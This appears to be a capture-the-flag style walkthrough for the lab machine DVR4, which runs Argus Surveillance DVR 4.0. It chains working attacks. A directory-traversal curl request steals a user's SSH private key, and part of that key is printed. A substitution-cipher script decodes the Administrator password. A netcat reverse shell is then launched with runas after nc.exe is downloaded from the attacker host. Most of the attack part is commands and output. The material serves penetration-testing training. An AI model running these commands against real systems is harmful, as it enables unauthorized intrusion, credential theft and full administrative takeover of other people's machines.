____


# Exploitation Guide for DVR4

## Summary

In this guide, we will gain a foothold on the target system by gaining access to an SSH key via a Directory Traversal vulnerability in the DVR software. We will then elevate our privilege by decoding the Administrator password found in a configuration file.

## Enumeration

### Nmap

We'll start by looking for open ports with an `nmap` scan.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC 192.168.120.239
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 11:09 EST
Nmap scan report for 192.168.120.239
Host is up (0.032s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginw>
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" ma 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
|_http-title: Argus Surveillance DVR
```

We find an SSH service running on port 22 and a webserver on port 8080. The webserver appears to be related to "Argus Surveillance DVR" according to the title.

### Webserver Enumeration

Using a browser and navigating to http://192.168.120.239:8080, we find the web controller for this DVR software.

We navigate to the About page at http://192.168.120.239:8080/About.html and discover that this is version `4.0` of the Argus Surveillance DVR. Let's see if there is anything we can use in ExploitDB by using `searchsploit`.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -u  
...
┌──(kali㉿kali)-[~]
└─$ searchsploit Argus Surveillance DVR 4.0
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
Argus Surveillance DVR 4.0 - Unquoted Service Path     | windows/local/50261.txt
Argus Surveillance DVR 4.0 - Weak Password Encryption  | windows/local/50130.py
Argus Surveillance DVR 4.0.0.0 - Directory Traversal   | windows_x86/webapps/45296.txt
Argus Surveillance DVR 4.0.0.0 - Privilege Escalation  | windows_x86/local/45312.c
------------------------------------------------------- ---------------------------------
```

We are attempting to gain a shell access to the target, so the Directory Traversal is probably a good option to start with. Let's take a look at it's contents.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -x 45296

# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
# Author: John Page (aka hyp3rlinx)
# Date: 2018-08-28
# Vendor: www.argussurveillance.com
# Software Link: http://www.argussurveillance.com/download/DVR_stp.exe
# CVE: N/A

# Description:
# Argus Surveillance DVR 4.0.0.0 devices allow Unauthenticated Directory Traversal,
# leading to File Disclosure via a ..%2F in the WEBACCOUNT.CGI RESULTPAGE parameter.

# PoC

curl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

# Result:

; for 16-bit app support
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

wave=mmdrv.dll
timer=timer.drv

# https://vimeo.com/287115273
# Greetz: ***Greetz: indoushka | Eduardo | GGA***

```

Using this information, we should be able to read arbitrary files on the target system. The example in the exploit content shows dumping the contents of **system.ini**. Let's give that a shot.

```
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.120.239:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini"                                     
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]

```

Success! Now we need to figure out what may be useful to dump from the target system. The only other service available to us is SSH. If we figure out any user accounts on the target, we could attempt to grab their SSH key to gain shell access.

Back in the browser, we navigate to the Users page at http://192.168.120.239:8080/Users.html, we find entries for the users Administrator and Viewer. Perhaps Viewer is a user account on the system. If so, we should be able to get a copy of their **id_rsa** file.

## Exploitation

Let's assume the user, viewer, stores their SSH key in the default location: **C:/Users/viewer/.ssh/id_rsa**

We can modify the curl command we ran before to attempt to grab this file. Let's redirect the response to a file.

```
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.120.239:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa" > id_rsa

┌──(kali㉿kali)-[~]
└─$ head id_rsa                                                                                            
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAuuXhjQJhDjXBJkiIftPZng7N999zteWzSgthQ5fs9kOhbFzLQJ5J
Ybut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAP
iJ/njNKI0tjtpeO3rjGMkKgNKwvv3y2EcCEt1d+LxsO3Wyb5ezuPT349v+MVs7VW04+mGx
pgheMgbX6HwqGSo9z38QetR6Ryxs+LVX49Bjhskz19gSF4/iTCbqoRo0djcH54fyPOm3OS
2LjjOKrgYM2aKwEN7asK3RMGDaqn1OlS4tpvCFvNshOzVq6l7pHQzc4lkf+bAi4K1YQXmo
7xqSQPAs4/dx6e7bD2FC0d/V9cUw8onGZtD8UXeZWQ/hqiCphsRd9S5zumaiaPrO4CgoSZ
GEQA4P7rdkpgVfERW0TP5fWPMZAyIEaLtOXAXmE5zXhTA9SvD6Zx2cMBfWmmsSO8F7pwAp
zJo1ghz/gjsp1Ao9yLBRmLZx4k7AFg66gxavUPrLAAAFkMOav4nDmr+JAAAAB3NzaC1yc2
```

Next, we have to adjust the permissions and attempt to SSH as `viewer` to the target.

```
┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa viewer@192.168.120.239

Microsoft Windows [Version 10.0.19042.1348]
(c) Microsoft Corporation. All rights reserved.

C:\Users\viewer>whoami
dvr4\viewer

C:\Users\viewer>
```

Success! We now have shell access on the target as viewer.

## Escalation

Let's continue to look into this Argus server. We discover the configuration file located at: **C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini**

```
C:\Users\viewer>dir "C:\ProgramData\PY_Software\Argus Surveillance DVR"
 Volume in drive C has no label.
 Volume Serial Number is 08DF-534D

 Directory of C:\ProgramData\PY_Software\Argus Surveillance DVR

02/11/2022  09:42 AM    <DIR>          .
02/11/2022  09:42 AM    <DIR>          ..
02/11/2022  09:42 AM                38 Argus Surveillance DVR.DVRSes
02/11/2022  09:42 AM             5,792 DVRParams.ini
12/03/2021  12:26 AM    <DIR>          Gallery
12/03/2021  12:24 AM    <DIR>          Images
12/03/2021  12:26 AM    <DIR>          Logs
               2 File(s)          5,830 bytes
               5 Dir(s)   5,876,322,304 bytes free

C:\Users\viewer>type "C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini"
[Main]
...                                                                               
                                                                                                            
[Users]                                                                                                     
LocalUsersCount=2                                                                                           
UserID0=434499                                                                                              
LoginName0=Administrator                                                                                    
FullName0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC8
75EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083                                      
FullControl0=1                                                                                              
CanClose0=1                                                                                                 
CanPlayback0=1                                                                                              
CanPTZ0=1                                                                                                   
CanRecord0=1                                                                                                
CanConnect0=1                                                                                               
CanReceiveAlerts0=1                                                                                         
CanViewLogs0=1                                                                                              
CanViewCamerasNumber0=0                                                                                     
CannotBeRemoved0=1                                                                                          
MaxConnectionTimeInMins0=0                                                                                  
DailyTimeLimitInMins0=0                                                                                     
MonthlyTimeLimitInMins0=0                                                                                   
DailyTrafficLimitInKB0=0                                                                                    
MonthlyTrafficLimitInKB0=0                                                                                  
MaxStreams0=0                                                                                               
MaxViewers0=0                                                                                               
MaximumBitrateInKb0=0                                                                                       
AccessFromIPsOnly0=                                                                                         
AccessRestrictedForIPs0=                                                                                    
MaxBytesSent0=0                                                                                             
Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8                                                      
...
```

Within this file, we find a password hash for the administrator account. It doesn't look like a familiar hash, so let's use `hash-identifier` to attempt to find out what kind of hash this is.

```
┌──(kali㉿kali)-[~]
└─$ hash-identifier     
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8

 Not Found.
```

That didn't work. Back when we were looking for exploits for this Argus server, there was an entry with "Weak Password Encryption" in the title. It's a python script. Let's take a look at it.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -m 50130
  Exploit: Argus Surveillance DVR 4.0 - Weak Password Encryption
      URL: https://www.exploit-db.com/exploits/50130
     Path: /usr/share/exploitdb/exploits/windows/local/50130.py
File Type: ASCII text

Copied to: /home/kali/50130.py

┌──(kali㉿kali)-[~]
└─$ cat 50130.py   
# Exploit Title: Argus Surveillance DVR 4.0 - Weak Password Encryption
# Exploit Author: Salman Asad (@LeoBreaker1411 / deathflash1411)
# Date: 12.07.2021
# Version: Argus Surveillance DVR 4.0
# Tested on: Windows 7 x86 (Build 7601) & Windows 10

# Note: Argus Surveillance DVR 4.0 configuration is present in
# C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini

# I'm too lazy to add special characters :P
characters = {
'ECB4':'1','B4A1':'2','F539':'3','53D1':'4','894E':'5',
'E155':'6','F446':'7','C48C':'8','8797':'9','BD8F':'0',
'C9F9':'A','60CA':'B','E1B0':'C','FE36':'D','E759':'E',
'E9FA':'F','39CE':'G','B434':'H','5E53':'I','4198':'J',
'8B90':'K','7666':'L','D08F':'M','97C0':'N','D869':'O',
'7357':'P','E24A':'Q','6888':'R','4AC3':'S','BE3D':'T',
'8AC5':'U','6FE0':'V','6069':'W','9AD0':'X','D8E1':'Y','C9C4':'Z',
'F641':'a','6C6A':'b','D9BD':'c','418D':'d','B740':'e',
'E1D0':'f','3CD9':'g','956B':'h','C875':'i','696C':'j',
'906B':'k','3F7E':'l','4D7B':'m','EB60':'n','8998':'o',
'7196':'p','B657':'q','CA79':'r','9083':'s','E03B':'t',
'AAFE':'u','F787':'v','C165':'w','A935':'x','B734':'y','E4BC':'z'}

# ASCII art is important xD
banner = '''
#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
'''
print(banner)

# Change this :)
pass_hash = "418DB740F641E03B956BE1D03F7EF6419083956BECB453D1ECB4ECB4"
if (len(pass_hash)%4) != 0:
        print("[!] Error, check your password hash")
        exit()
split = []
n = 4
for index in range(0, len(pass_hash), n):
        split.append(pass_hash[index : index + n])

for key in split:
        if key in characters.keys():
                print("[+] " + key + ":" + characters[key])
        else:
                print("[-] " + key + ":Unknown") 
```

Looking over this script, we find that we actually have an encrypted password and it's a simple substitution cipher. The hash appears to be hardcoded in the script. Let's replace it with the one we found in the Argus config file and run it.

```
# Change this :)
pass_hash = "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8"
```

```
┌──(kali㉿kali)-[~]
└─$ python3 50130.py 

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown
```

It appears that we were able to decode the password except for the final character. The last character of the password must be a special character as this script only accounts for numbers and letters. To figure out which special character it is, let's go back to the Argus website and open the Users page once again. We can create a new user account by clicking the "New User" button.

![Add new user on website](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_97_image_1_ZZ3L7dbK.png)

Add new user on website

With the new user added, let's click "Change Password" in the row containing our new user account. We can set a password for this account and then read **DVRParams.ini** to see how each character is represented. Let's set a password of `!@#$%^&*()` and read the INI file in our SSH session.

```
C:\Users\viewer>type "C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini"
...
UserID2=204960737                                                                                           
LoginName2=kali                                                                                             
FullName2=                                                                                                  
FullControl2=1                                                                                              
CanClose2=1                                                                                                 
CanPlayback2=1                                                                                              
CanPTZ2=1                                                                                                   
CanRecord2=1                                                                                                
CanConnect2=1                                                                                               
CanReceiveAlerts2=1                                                                                         
CanViewLogs2=1                                                                                              
CanViewCamerasNumber2=0                                                                                     
CannotBeRemoved2=0                                                                                          
MaxConnectionTimeInMins2=0                                                                                  
DailyTimeLimitInMins2=0                                                                                     
MonthlyTimeLimitInMins2=0                                                                                   
DailyTrafficLimitInKB2=0                                                                                    
MonthlyTrafficLimitInKB2=0                                                                                  
MaxStreams2=0                                                                                               
MaxViewers2=0                                                                                               
MaximumBitrateInKb2=0                                                                                       
AccessFromIPsOnly2=                                                                                         
AccessRestrictedForIPs2=                                                                                    
MaxBytesSent2=0                                                                                             
Password2=B39878A7 
...
```

That's odd. It appears that only 2 characters were encoded. It may be better to create single character passwords and check the encoded password one by one to figure out what the last character of the Administrator password is.

Starting with "!", we find the following results:

- ! = B398
- @ = 78A7
- # = <blank> (This is probably why the first password didn't work)
- $ = D9A8

We can stop here as the last character of the password we are trying to crack is "D9A8". So, now we know that the Administrator password is `14WatchD0g$`. We can attempt to use this password to SSH into the target using the Administrator account but it doesn't seem to be allowed.

```
┌──(kali㉿kali)-[~]
└─$ ssh administrator@192.168.120.239   
administrator@192.168.120.239's password: 
Permission denied, please try again.
```

Perhaps we can upload a netcat executable and start an Administrator reverse shell using `runas`. Let's copy the **nc.exe** to our working directory and host it in a python webserver.

```
┌──(kali㉿kali)-[~]
└─$ cp /usr/share/windows-binaries/nc.exe .                          
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Back in the SSH session, let's create a temp directory and download **nc.exe** from our Kali host to this folder.

```
C:\Users\viewer>mkdir C:\temp

C:\Users\viewer>powershell.exe -c "iwr http://192.168.118.14/nc.exe -OutFile C:\temp\nc.exe"  
```

Next, let's start a listener to catch our reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
```

Finally, from our SSH session, let's use `runas` to attempt to start a reverse shell using the Administrator credentials.

```
C:\Users\viewer>runas /env /profile /user:DVR4\Administrator "C:\temp\nc.exe -e cmd.exe 192.168.118.14 443" 
Enter the password for DVR4\Administrator:                                                                  
Attempting to start C:\temp\nc.exe -e cmd.exe 192.168.118.14 443 as user "DVR4\Administrator" ...
```

In our listener, we receive a connection from the target.

```
connect to [192.168.118.14] from (UNKNOWN) [192.168.120.239] 56706
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\Users\viewer>whoami
whoami
dvr4\administrator

C:\Users\viewer>
```

Success! We now have Administrator access on the target system.
